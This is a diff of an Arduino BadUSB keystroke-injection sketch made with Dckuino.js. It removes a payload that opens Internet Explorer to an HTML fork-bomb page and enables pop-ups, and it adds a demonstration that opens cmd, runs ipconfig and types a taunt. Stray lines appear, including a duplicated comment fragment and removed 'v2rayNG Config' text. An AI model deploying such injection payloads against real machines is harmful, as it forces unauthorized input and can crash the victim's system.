@@ -1,4 +1,5 @@
 /*
+ * Generated with <3 by /*
  * Generated with <3 by Dckuino.js, an open source project !
  */
 
@@ -20,29 +21,30 @@ void setup()
   // Wait 500ms
   delay(500);
 
+  // Open cmd
   delay(2000);
 
-  Keyboard.press(KEY_LEFT_CTRL);
-  Keyboard.press(KEY_ESC);
+  Keyboard.press(KEY_LEFT_GUI);
+  Keyboard.press('r');
   Keyboard.releaseAll();
 
-  delay(200);
+  delay(2000);
 
-  Keyboard.print("C:\\Program Files\\Internet Explorer\\iexplore.exe https://jonnybanana.github.io/HTML-Fork-Bomb.github.io/");
+  Keyboard.print("cmd");
 
-  delay(200);
+  delay(500);
 
   typeKey(KEY_RETURN);
 
-  // set a long delay to give time to this disgusting browser
+  delay(500);
+
+  Keyboard.print("ipconfig");
+
+  typeKey(KEY_RETURN);
+
   delay(1000);
 
-  // it's time to enable Pop-Up
-  typeKey(KEY_TAB);
-
-  delay(200);
-
-  typeKey(KEY_RETURN);
+  Keyboard.print("Hi ... IM SECBAZ!");
 
   // Ending stream
   Keyboard.end();
@@ -50,6 +52,3 @@ void setup()
 
 /* Unused endless loop */
 void loop() {}
-
-# v2rayNG
-v2rayNG Config Free 
